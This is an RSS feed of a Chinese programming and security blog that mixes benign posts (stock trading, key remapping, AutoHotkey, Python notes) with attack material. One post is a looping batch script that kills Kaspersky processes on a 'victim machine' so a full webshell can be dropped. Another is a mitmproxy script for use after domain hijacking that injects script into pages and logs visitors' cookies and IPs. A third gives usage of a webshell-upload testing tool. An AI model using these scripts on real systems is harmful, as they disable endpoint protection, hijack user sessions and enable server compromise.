<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="https://www.w3.org/2005/Atom">
  <channel>
    <title>quanyechavshuo</title>
    <description>A blog about programming and network security</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Wed, 12 Sep 2018 21:22:52 -0400</pubDate>
    <lastBuildDate>Wed, 12 Sep 2018 21:22:52 -0400</lastBuildDate>
    <generator>Jekyll v3.7.3</generator>
    
      <item>
        <title>管理员权限杀卡巴斯基进程</title>
        <description>&lt;h3 id=&quot;code&quot;&gt;Code&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;:start
taskkill /F /IM avp.exe
taskkill /F /IM vapm.exe
taskkill /F /IM klnagent.exe
goto start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;可用于一个管理员权限运行的免杀shell中执行这个批处理文件,运行后会不断强制杀死kaspersky的进程,但不会彻底杀掉,因为kaspersky会自动复活,但上面这个无限循环可使kaspersky的保护功能失效.可用上的场景:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1.受害机当前用户为administrator&lt;/li&gt;
  &lt;li&gt;2.受害机运行了一个免杀的shell(功能有限的shell,功能越少越好免杀),这个shell只有执行命令的功能&lt;/li&gt;
  &lt;li&gt;3.通过shell运行上面的批处理”杀死“kaspersky后再上大马，大马可不用免杀&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Fri, 31 Aug 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/web/2018/08/31/%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%9D%80%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E8%BF%9B%E7%A8%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2018/08/31/%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%9D%80%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E8%BF%9B%E7%A8%8B/</guid>
        
        <category>kaspersky</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>web安全测试常规流程</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;[新手篇，老鸟飞]&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/paper/blob/master/web%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%84%E6%B5%81%E7%A8%8B.pdf&quot;&gt;read more…&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 28 Aug 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/web/2018/08/28/web%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%84%E6%B5%81%E7%A8%8B/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2018/08/28/web%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%84%E6%B5%81%E7%A8%8B/</guid>
        
        <category>安全测试</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>利弗莫尔操盘规则</title>
        <description>&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;股票大作手操盘术&lt;/code&gt;中利弗莫尔操盘规则内容有些繁杂冗余,笔者认为可用一句话小结:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;当价格突破最近一次相同方向的关键点3个点时是交易点,可按20%,20%,20%,40%分批次加仓
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如下图:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/livermore.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;graffle文件在&lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/livermore.graffle&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 07 Jun 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/%E7%82%92%E8%82%A1/2018/06/07/%E5%88%A9%E5%BC%97%E8%8E%AB%E5%B0%94%E6%93%8D%E7%9B%98%E8%A7%84%E5%88%99/</link>
        <guid isPermaLink="true">http://localhost:4000/%E7%82%92%E8%82%A1/2018/06/07/%E5%88%A9%E5%BC%97%E8%8E%AB%E5%B0%94%E6%93%8D%E7%9B%98%E8%A7%84%E5%88%99/</guid>
        
        <category>利弗莫尔</category>
        
        <category>投机</category>
        
        
        <category>炒股</category>
        
      </item>
    
      <item>
        <title>域名劫持后利用脚本</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;本文记录一种在域名劫持后通过mitmproxy进行http会话劫持的利用脚本,该脚本通过mitmdump的反向代理工作模式进行流量劫持.&lt;/p&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;

&lt;p&gt;1.通过修改域名的A记录来进行域名劫持&lt;/p&gt;

&lt;p&gt;2.在域名的新A记录主机上安装mitmproxy:&lt;code class=&quot;highlighter-rouge&quot;&gt;pip3 install mitmproxy&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;3.在域名的新A记录主机上运行:
    &lt;code class=&quot;highlighter-rouge&quot;&gt;mitmdump --set allow_remote=true -—listen-host 0.0.0.0 -s xdomain.py --mode reverse:http://xxx.xxx.xxx:80 -p 80&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--listen-host代表本地监听ip
--mode reverse代表以反向代理的模式进行工作
--set allow_remote=true代表支持客户端访问的时候是通过代理访问的
运行时需要需要上面命令中的http://xxx.xxx.xxx:80为目标网站地址,且修改下面代码中的http://xxx.xxx.xxx为目标网站地址
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import os
import re
import chardet


def request(flow):
    # url=flow.request.url
    # flow.request.headers['User-Agent']='xxx'
    pass


def response(flow):
    url = flow.request.url
    print(url)
    if &quot;http://xxx.xxx.xxx&quot; in url:
        content = flow.response.content
        cookie = flow.request.headers['Cookie']
        ip = str(flow.client_conn.ip_address).split(&quot;:&quot;)[0]
        bytes_encoding = chardet.detect(content)['encoding']
        origin_html = content.decode(encoding=bytes_encoding, errors=&quot;ignore&quot;)
        if &quot;&amp;lt;/html&amp;gt;&quot; in origin_html:
            insert_xss = '''&amp;lt;script&amp;gt;alert(&quot;you're hacked&quot;)&amp;lt;/script&amp;gt;&amp;lt;/html&amp;gt;'''
            new_html = origin_html.replace(&quot;&amp;lt;/html&amp;gt;&quot;, insert_xss)
            flow.response.text = new_html
        return_value = {'ip': ip, 'url': url, 'cookie': cookie}
        with open(&quot;mitm.log&quot;, &quot;a+&quot;) as f:
            f.write(str(return_value) + &quot;\n&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://raw.githubusercontent.com/3xp10it/mytools/master/xdomain.py&quot;&gt;download&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Tue, 29 May 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/web/2018/05/29/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E5%90%8E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2018/05/29/%E5%9F%9F%E5%90%8D%E5%8A%AB%E6%8C%81%E5%90%8E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/</guid>
        
        <category>mitmproxy</category>
        
        <category>mitmdump</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>炒股</title>
        <description>&lt;h3 id=&quot;k线&quot;&gt;k线&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ricequant.com/community/topic/2393/&quot;&gt;talib-K线模式识别&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32470289&quot;&gt;关于蜡烛图,看完这一篇文章就够了&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;指标&quot;&gt;指标&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://stock.quote.stockstar.com/tech_601318.shtml&quot;&gt;快速指标分析&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://m.stock.pingan.com/omm/mobile/zixun/m.html?id=1000052297&amp;amp;t=22493765&amp;amp;unionId=a696c392e1444ee7a9ba8a5d95d84414&quot;&gt;ene指标应用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.gupang.com/201606/39839.html&quot;&gt;kdj指标应用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.360doc.com/content/16/0204/09/11492064_532629892.shtml&quot;&gt;macd指标应用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.yingjia360.com/rsi/2016-07-08/30905.html&quot;&gt;rsi指标应用&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;交易量应用
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://zhidao.baidu.com/question/30738506.html&quot;&gt;1&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;http://guba.eastmoney.com/news,gssz,720380626.html&quot;&gt;2&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://wenku.baidu.com/view/14b3b8be7f1922791788e815.html&quot;&gt;3&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;买卖点&quot;&gt;买卖点&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://wenku.baidu.com/view/75724ae05ff7ba0d4a7302768e9951e79b8969a1.html&quot;&gt;格兰维尔八大买卖法则&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://baijiahao.baidu.com/s?id=1561500866945671&amp;amp;wfr=spider&amp;amp;for=pc&quot;&gt;红三兵买入&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.360doc.com/content/15/1027/16/7180626_508769390.shtml&quot;&gt;江恩买卖十二法则&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 01 May 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/%E7%82%92%E8%82%A1/2018/05/01/%E7%82%92%E8%82%A1/</link>
        <guid isPermaLink="true">http://localhost:4000/%E7%82%92%E8%82%A1/2018/05/01/%E7%82%92%E8%82%A1/</guid>
        
        <category>炒股</category>
        
        
        <category>炒股</category>
        
      </item>
    
      <item>
        <title>自动测试上传功能是否可上传webshell</title>
        <description>&lt;h2 id=&quot;about&quot;&gt;About&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/3xp10it/xupload&quot;&gt;xupload&lt;/a&gt;是一个用于自动测试上传功能是否可上传webshell的工具&lt;/p&gt;

&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;

&lt;p&gt;[!] legal disclaimer: Usage of xupload.py for attacking targets without prior mutual consent is illegal.It is the end user’s responsibility to obey all applicable local, state and federal laws.Developers assume no liability and are not responsible for any misuse or damage caused by this program.&lt;/p&gt;

&lt;h2 id=&quot;usage&quot;&gt;Usage&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 xupload.py -h

usage: xupload.py [-h] [-u URL] [--cookie COOKIE] --suffix SUFFIX [--batch]
                  [--delay DELAY] [--force-ssl] [-r R]

xupload.py is a program that automates the testing of uploading functionality.
If xupload.py does not successfully upload webshell, try more tips at:
1.http://3xp10it.cc/web/2016/08/12/fckeditor各版本绕过/
2.https://paper.seebug.org/219/
3.http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf
4.https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/

optional arguments:
  -h, --help         show this help message and exit
  -u URL, --url URL  The target url which has upload function
  --cookie COOKIE    HTTP Cookie header value
  --suffix SUFFIX    The web server's script type: 'php','asp','aspx','jsp'
  --batch            Never ask for user input, use the default behavior
  --delay DELAY      Delay in seconds between each HTTP request
  --force-ssl        Force usage of SSL/HTTPS
  -r R               Load HTTP request from a file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;eg.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python3 -u http://192.168.8.190/vulnerabilities/upload/ --cookie &quot;PHPSESSID=v7rebkn2dn8ln1ebuqfhjf00s4;security=low&quot; --batch&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;attention&quot;&gt;Attention&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-r&lt;/code&gt;参数是在xupload.py无法自动识别url对应的html中上传表单时要用到的参数(一般通过插件实现上传功能的url无法通过xupload.py自动获取上传表单),用于指定一个http上传文件时拦截到的请求包,如果url是https开头则需要指定&lt;code class=&quot;highlighter-rouge&quot;&gt;--force-ssl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; href=&quot;http://oiqwnrsx4.bkt.clouddn.com/xupload.mov&quot;&gt;视频示例&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 25 Apr 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/web/2018/04/25/%E8%87%AA%E5%8A%A8%E6%B5%8B%E8%AF%95%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E6%98%AF%E5%90%A6%E5%8F%AF%E4%B8%8A%E4%BC%A0webshell/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2018/04/25/%E8%87%AA%E5%8A%A8%E6%B5%8B%E8%AF%95%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E6%98%AF%E5%90%A6%E5%8F%AF%E4%B8%8A%E4%BC%A0webshell/</guid>
        
        <category>upload</category>
        
        <category>python</category>
        
        <category>webshell</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>caps键按住时映射为ctrl,按下一次时映射为esc</title>
        <description>&lt;h3 id=&quot;0x1-about&quot;&gt;0x1 About&lt;/h3&gt;

&lt;p&gt;使用vim和使用常用快捷键时这样设置会带来极大的便利:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;caps键按住时映射为ctrl,按下一次时映射为esc&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;0x2-detail&quot;&gt;0x2 Detail&lt;/h3&gt;

&lt;h4 id=&quot;macos&quot;&gt;macOS&lt;/h4&gt;

&lt;p&gt;参考&lt;a href=&quot;http://3xp10it.cc/linux/2017/03/11/%E5%AE%89%E8%A3%85macOS-sierra%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B/&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;linux&quot;&gt;linux&lt;/h4&gt;

&lt;p&gt;参考&lt;a href=&quot;https://askubuntu.com/questions/177824/remapping-caps-lock-to-control-and-escape-not-the-usual-way/228379&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;1.Under System Preferences &amp;gt; Keyboard Layout &amp;gt; Options… &amp;gt; Ctrl key position, I checked ‘Caps Lock as Ctrl’.
2.&lt;code class=&quot;highlighter-rouge&quot;&gt;xcape -e 'Control_L=Escape'&lt;/code&gt;
或
&lt;code class=&quot;highlighter-rouge&quot;&gt;setxkbmap -option 'caps:ctrl_modifier'  xcape -e 'Caps_Lock=Escape'&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&quot;windows&quot;&gt;windows&lt;/h4&gt;

&lt;p&gt;参考&lt;a href=&quot;http://vim.wikia.com/wiki/Map_caps_lock_to_escape_in_Windows&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 25 Apr 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/vim/2018/04/25/caps%E9%94%AE%E6%8C%89%E4%BD%8F%E6%97%B6%E6%98%A0%E5%B0%84%E4%B8%BActrl,%E6%8C%89%E4%B8%8B%E4%B8%80%E6%AC%A1%E6%97%B6%E6%98%A0%E5%B0%84%E4%B8%BAesc/</link>
        <guid isPermaLink="true">http://localhost:4000/vim/2018/04/25/caps%E9%94%AE%E6%8C%89%E4%BD%8F%E6%97%B6%E6%98%A0%E5%B0%84%E4%B8%BActrl,%E6%8C%89%E4%B8%8B%E4%B8%80%E6%AC%A1%E6%97%B6%E6%98%A0%E5%B0%84%E4%B8%BAesc/</guid>
        
        <category>caps</category>
        
        <category>ctrl</category>
        
        <category>esc</category>
        
        <category>vim</category>
        
        
        <category>vim</category>
        
      </item>
    
      <item>
        <title>港股基础概念</title>
        <description>&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://stock.qq.com/a/20180129/012522.htm&quot;&gt;窝轮与牛熊证&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://finance.sina.com.cn/stock/hkstock/warrants/20090206/15065826186.shtml&quot;&gt;牛熊证回收价与行使价&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Sat, 07 Apr 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/%E7%82%92%E8%82%A1/2018/04/07/%E6%B8%AF%E8%82%A1%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/</link>
        <guid isPermaLink="true">http://localhost:4000/%E7%82%92%E8%82%A1/2018/04/07/%E6%B8%AF%E8%82%A1%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/</guid>
        
        <category>炒股</category>
        
        
        <category>炒股</category>
        
      </item>
    
      <item>
        <title>快速切换至目标应用程序</title>
        <description>&lt;h3 id=&quot;0x0-about&quot;&gt;0x0 About&lt;/h3&gt;

&lt;p&gt;本文介绍macOS和windows下实现快速切换至后台中的目标应用程序的方法&lt;/p&gt;

&lt;h4 id=&quot;0xa-macos&quot;&gt;0xa macOS&lt;/h4&gt;

&lt;p&gt;alfred的workflows功能可实现快速切换至后台中的目标应用程序的方法.在使用macOS时,一般会使用到多个app,如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/alfred_quick_switch_app1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在使用iterm2时想切换至pd的kali机上(图中第6个图标),或者在pd的kali机上想切换到firefox上,或者当前在任意app中想切换到另一个指定的app时直接使用&lt;code class=&quot;highlighter-rouge&quot;&gt;cmd+tab&lt;/code&gt;效率较低,可通过alfred的workflows功能实现&lt;code class=&quot;highlighter-rouge&quot;&gt;一键切换&lt;/code&gt;.&lt;/p&gt;

&lt;h5 id=&quot;detail&quot;&gt;Detail&lt;/h5&gt;

&lt;p&gt;最终实现3个应用程序的快速切换快捷键:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;firefox 对应 &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd+f&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;pd的kali机 对应 &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd+p&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;pd的iterm2 对应 &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd+i&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;alfred完成如下图:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/alfred_quick_switch_app2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;以其中pd的kali机为例,&lt;code class=&quot;highlighter-rouge&quot;&gt;Hotkey&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;Launch App/Files&lt;/code&gt;详情分别如下图:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/alfred_quick_switch_app3.png&quot; alt=&quot;3&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/alfred_quick_switch_app4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;0xb-windows&quot;&gt;0xb windows&lt;/h4&gt;

&lt;p&gt;autohotkey是一个win下的效率神器,可通过autohotkey来实现macOS下的相同功能,本文只涉及&lt;code class=&quot;highlighter-rouge&quot;&gt;firefox|explorer&lt;/code&gt;的快速切换,其他应用程序对应的autohotkey脚本的写法可能不同&lt;/p&gt;

&lt;h5 id=&quot;detail-1&quot;&gt;Detail&lt;/h5&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#f::switchToFirefox()
switchToFirefox(){
sendinput, {SC0E8} ;scan code of an unassigned key. Do I NEED this?
IfWinNotExist, ahk_class MozillaWindowClass
	Run, firefox.exe
if WinActive(&quot;ahk_exe firefox.exe&quot;)
	Send ^{tab}
else
	{
	;WinRestore ahk_exe firefox.exe
	WinActivate ahk_exe firefox.exe
	;sometimes winactivate is not enough. the window is brought to the foreground, but not put into FOCUS.
	;the below code should fix that.
	WinGet, hWnd, ID, ahk_class MozillaWindowClass
	DllCall(&quot;SetForegroundWindow&quot;, UInt, hWnd) 
	}
}

#e::switchToExplorer()
switchToExplorer(){
IfWinNotExist, ahk_class CabinetWClass
	Run, explorer.exe
GroupAdd, taranexplorers, ahk_class CabinetWClass
if WinActive(&quot;ahk_exe explorer.exe&quot;)
	GroupActivate, taranexplorers, r
else
	WinActivate ahk_class CabinetWClass ;you have to use WinActivatebottom if you didn't create a window group.
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ahk脚本代码地址在&lt;a href=&quot;https://github.com/3xp10it/ahk&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 29 Mar 2018 00:00:00 -0400</pubDate>
        <link>http://3xp10it.cc/auxilary/2018/03/29/%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E8%87%B3%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2018/03/29/%E5%BF%AB%E9%80%9F%E5%88%87%E6%8D%A2%E8%87%B3%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</guid>
        
        <category>alfred</category>
        
        <category>效率</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>流畅的python第5-7章笔记</title>
        <description>&lt;h2 id=&quot;把函数视作对象&quot;&gt;把函数视作对象&lt;/h2&gt;

&lt;h3 id=&quot;第5章-一等函数&quot;&gt;第5章 一等函数&lt;/h3&gt;

&lt;p&gt;1.在函数式编程范式中,最为人熟知的高阶函数有&lt;code class=&quot;highlighter-rouge&quot;&gt;map&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;filter&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;reduce&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;apply&lt;/code&gt;.函数式语言通常会提供map,filter和reduce三个高阶函数(有时使用不同的名称).在python3中,map和filter还是内置函数,但是由于引入了列表推导和生成器表达式,它们变得没那么重要了.列表推导和生成器表达式具有map和filter两个函数的功能.而且更易于阅读.&lt;/p&gt;

&lt;p&gt;2.&lt;code class=&quot;highlighter-rouge&quot;&gt;sum&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;reduce&lt;/code&gt;函数用于求和.最好使用sum函数,可读性更好.sum和reduce的通用思想是把某个操作连续应用到序列的元素上,累计之前的结果,把一系列值&lt;code class=&quot;highlighter-rouge&quot;&gt;归约&lt;/code&gt;成一个值.&lt;code class=&quot;highlighter-rouge&quot;&gt;all&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;any&lt;/code&gt;也是内置的归约函数&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [2]: from functools import reduce

In [3]: from operator import add

In [4]: reduce(add,range(100))
Out[4]: 4950

In [5]: sum(range(100))
Out[5]: 4950


In [6]: all('niaho')
Out[6]: True

In [7]: all('niaho',['wohao'])
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-7-663ce7255241&amp;gt; in &amp;lt;module&amp;gt;()
----&amp;gt; 1 all('niaho',['wohao'])

TypeError: all() takes exactly one argument (2 given)

In [8]: all(('niaho',['wohao']))
Out[8]: True

In [9]: all(('niaho',['wohao'],''))
Out[9]: False

In [10]: any('niaho')
Out[10]: True

In [12]: any('niaho',['wohao'])
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
&amp;lt;ipython-input-12-3e515d3dba5a&amp;gt; in &amp;lt;module&amp;gt;()
----&amp;gt; 1 any('niaho',['wohao'])

TypeError: any() takes exactly one argument (2 given)

In [13]: any(('niaho',['wohao'],''))
Out[13]: True
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;3.为了使用高阶函数,有时创建一次性的小型函数更便利.这便是匿名函数存在的原因.lambda关键字在python表达式内创建匿名函数.然而,python简单的句法限制了lambda函数的定义体只能使用纯表达式.换句话说,lambda函数的定义体中不能赋值,也不能使用while和try等python语句.eval函数好像也是这样.除了作为参数传给高阶函数之外,python很少使用匿名函数.由于句法上的限制,非平凡的lambda表达式要么难以阅读,要么无法写出.lambda句法只是语法糖:与def语句一样,lambda表达式会创建函数对象&lt;/p&gt;

&lt;p&gt;4.python数据模型文档列出了7种可调用对象&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;用户定义的函数.使用def或lambda表达式创建&lt;/li&gt;
  &lt;li&gt;内置函数.使用c语言(cpython)实现的函数,如len或time.strftime&lt;/li&gt;
  &lt;li&gt;内置方法.使用c语言实现的方法,如dict.get&lt;/li&gt;
  &lt;li&gt;方法.在类的定义体中定义的函数&lt;/li&gt;
  &lt;li&gt;类.调用类时会运行类的&lt;code class=&quot;highlighter-rouge&quot;&gt;__new__&lt;/code&gt;方法创建一个实例,然后运行__init__方法,初始化实例,最后把实例返回给调用方&lt;/li&gt;
  &lt;li&gt;类的实例.如果类定义了&lt;code class=&quot;highlighter-rouge&quot;&gt;__call__&lt;/code&gt;方法,那么它的实例可以作为函数调用&lt;/li&gt;
  &lt;li&gt;生成器函数.使用&lt;code class=&quot;highlighter-rouge&quot;&gt;yield&lt;/code&gt;关键字的函数或方法.调用生成器函数返回的是生成器对象,生成器函数还可以作为协程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;5.从定位参数到仅限关键字参数&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;In [17]: my_tag={'name':'img','title':'Sunset Boulevard','src':'sunset.jpg','cls':'framed'}

In [18]: tag(**my_tag)
name is:img
content is:()
cls is:framed
attrs is:{'title': 'Sunset Boulevard', 'src': 'sunset.jpg'}

In [19]: def tag(name,*content,cls=None,**attrs):
    ...:     print(&quot;name is:&quot;+name)
    ...:     print(&quot;content is:&quot;+str(content))
    ...:     print(&quot;cls is:&quot;+str(cls))
    ...:     print(&quot;attrs is:&quot;+str(attrs))
    ...:
    ...:

In [20]: tag('p','hello')
name is:p
content is:('hello',)
cls is:None
attrs is:{}

In [21]: my_tag={'name':'img','title':'Sunset Boulevard','src':'sunset.jpg','cls':'framed'}

In [22]: tag(**my_tag)
name is:img
content is:()
cls is:framed
attrs is:{'title': 'Sunset Boulevard', 'src': 'sunset.jpg'}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;调用&lt;code class=&quot;highlighter-rouge&quot;&gt;tag('p','hello')&lt;/code&gt;时,第一个参数后面的任意个参数会被&lt;code class=&quot;highlighter-rouge&quot;&gt;*content&lt;/code&gt;捕获,存入一个元组
